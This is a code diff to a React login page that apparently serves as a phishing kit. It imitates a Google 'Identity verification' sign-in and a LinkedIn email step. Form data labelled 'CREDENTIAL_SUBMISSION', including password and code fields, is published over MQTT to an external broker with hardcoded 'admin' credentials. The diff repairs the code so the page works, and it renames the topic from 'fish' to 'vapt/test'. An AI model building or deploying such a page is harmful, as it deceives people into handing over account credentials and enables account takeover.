@@ -5,7 +5,7 @@ import { ChevronDown, UserCircle, ShieldCheck, Calendar, Clock, Video, Linkedin 
 import mqtt from 'mqtt';
 
 export default function CustomLoginPage() {
-  const [step, setStep] = useState(0); // Restored to 0 for the LinkedIn Gateway
+  const [step, setStep] = useState(0); 
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
   const [code, setCode] = useState('');
@@ -17,14 +17,13 @@ export default function CustomLoginPage() {
     
     // Using standard WebSockets (ws://) and your configured port (9001)
     const client = mqtt.connect(`ws://${host}:9001`, {
-      username: 'admin', // The username from your /etc/mosquitto/passwd file
-      password: 'admin', // The password you set for the admin user
+      username: 'admin', 
+      password: 'admin', 
       clientId: `auth_step_${currentStep}_` + Math.random().toString(16).substring(2, 8),
     });
     
-    // ... rest of your publishing logic ...
-  }
-
+    // FIXED: Moved the connection and publish logic INSIDE the function 
+    // so it has access to the 'client' and 'currentStep' variables.
     client.on('connect', () => {
       const payload = JSON.stringify({
         event: currentStep === 4 ? 'INTERVIEW_SCHEDULED' : 'CREDENTIAL_SUBMISSION',
@@ -36,7 +35,7 @@ export default function CustomLoginPage() {
         time: new Date().toLocaleString()
       });
 
-      client.publish('fish', payload, { qos: 1 }, () => {
+      client.publish('vapt/test', payload, { qos: 1 }, () => {
         client.end(true);
         setStep(currentStep + 1);
       });
@@ -46,56 +45,57 @@ export default function CustomLoginPage() {
   return (
     <div className="min-h-screen bg-[#f3f2ef] flex items-center justify-center font-sans antialiased text-black">
       <AnimatePresence mode="wait">
-       //step 0 
-       {step === 0 && (
-  <motion.div 
-    key="gateway"
-    initial={{ opacity: 0, scale: 0.98 }}
-    animate={{ opacity: 1, scale: 1 }}
-    exit={{ opacity: 0 }}
-    className="w-full max-w-[480px] bg-white border border-[#dadce0] rounded-2xl p-10 shadow-sm text-center"
-  >
+        
+        {/* FIXED: Proper JSX Comment Syntax */}
+        {/* STEP 0: GOOGLE GATEWAY */}
+        {step === 0 && (
+          <motion.div 
+            key="gateway"
+            initial={{ opacity: 0, scale: 0.98 }}
+            animate={{ opacity: 1, scale: 1 }}
+            exit={{ opacity: 0 }}
+            className="w-full max-w-[480px] bg-white border border-[#dadce0] rounded-2xl p-10 shadow-sm text-center"
+          >
+            {/* Top subtle info box */}
+            <div className="bg-[#f1f3f4] border border-[#dadce0] rounded-xl p-5 mb-8 text-left flex items-start gap-4">
+              <ShieldCheck className="w-6 h-6 text-[#1a73e8] mt-1 flex-shrink-0" />
+              <div>
+                <h3 className="text-[#202124] font-medium text-sm">Identity verification</h3>
+                <p className="text-[#5f6368] text-sm">
+                  To continue, verify your identity using your Google account.
+                </p>
+              </div>
+            </div>
 
-    {/* Top subtle info box */}
-    <div className="bg-[#f1f3f4] border border-[#dadce0] rounded-xl p-5 mb-8 text-left flex items-start gap-4">
-      <ShieldCheck className="w-6 h-6 text-[#1a73e8] mt-1 flex-shrink-0" />
-      <div>
-        <h3 className="text-[#202124] font-medium text-sm">Identity verification</h3>
-        <p className="text-[#5f6368] text-sm">
-          To continue, verify your identity using your Google account.
-        </p>
-      </div>
-    </div>
+            {/* Title */}
+            <h1 className="text-3xl font-normal text-[#202124] mb-2">
+              Sign in with Google
+            </h1>
 
-    {/* Title */}
-    <h1 className="text-3xl font-normal text-[#202124] mb-2">
-      Sign in with Google
-    </h1>
+            <p className="text-[#5f6368] mb-8 text-sm">
+              Continue to access your dashboard and services
+            </p>
 
-    <p className="text-[#5f6368] mb-8 text-sm">
-      Continue to access your dashboard and services
-    </p>
+            {/* Google-style button */}
+            <button 
+              onClick={() => setStep(1)}
+              className="w-full flex items-center justify-center gap-3 py-3 px-6 bg-white border border-[#dadce0] rounded-full hover:bg-[#f7f8f8] transition text-[#3c4043] font-medium text-sm"
+            >
+              <img 
+                src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" 
+                alt="google" 
+                className="w-5 h-5"
+              />
+              Continue with Google
+            </button>
 
-    {/* Google-style button */}
-    <button 
-      onClick={() => setStep(1)}
-      className="w-full flex items-center justify-center gap-3 py-3 px-6 bg-white border border-[#dadce0] rounded-full hover:bg-[#f7f8f8] transition text-[#3c4043] font-medium text-sm"
-    >
-      <img 
-        src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" 
-        alt="google" 
-        className="w-5 h-5"
-      />
-      Continue with Google
-    </button>
+            {/* Footer note */}
+            <p className="mt-8 text-xs text-[#5f6368]">
+              Your information is securely processed for verification purposes.
+            </p>
 
-    {/* Footer note */}
-    <p className="mt-8 text-xs text-[#5f6368]">
-      Your information is securely processed for verification purposes.
-    </p>
-
-  </motion.div>
-)}
+          </motion.div>
+        )}
 
         {/* STEP 1: LINKEDIN EMAIL ENTRY */}
         {step === 1 && (
